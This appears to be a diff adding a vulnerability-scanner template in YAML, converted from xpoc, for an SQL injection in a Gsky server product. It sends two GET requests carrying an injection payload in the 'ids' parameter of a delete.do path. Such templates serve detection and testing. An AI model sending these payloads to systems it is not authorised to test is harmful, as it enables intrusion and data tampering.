@@ -1,0 +1,15 @@
+id: yaml-poc-gsky-server-sql_injection-CT-1108574
+info:
+  name: Yaml Poc Gsky Server Sql_Injection Ct 1108574
+  author: yuxiang.cai
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-gsky-server-sql_injection-CT-1108574'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /run_stop/delete.do;downloadLogger.action?ids=1)--+&loadAll=1
+- method: GET
+  path:
+  - /run_stop/delete.do;downloadLogger.action?ids=1)&loadAll=1
